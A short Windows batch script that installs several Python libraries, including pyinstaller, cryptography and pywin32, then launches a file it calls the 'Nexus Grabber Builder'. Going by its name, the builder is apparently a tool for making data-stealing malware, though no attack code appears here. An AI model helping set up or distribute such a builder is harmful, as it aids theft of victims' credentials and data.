@echo off
echo Installing required Python packages...
pip install customtkinter pillow pywin32 psutil cryptography requests pyinstaller
echo.
echo Launching Nexus Grabber Builder...
python Nexus_grabber.py
pause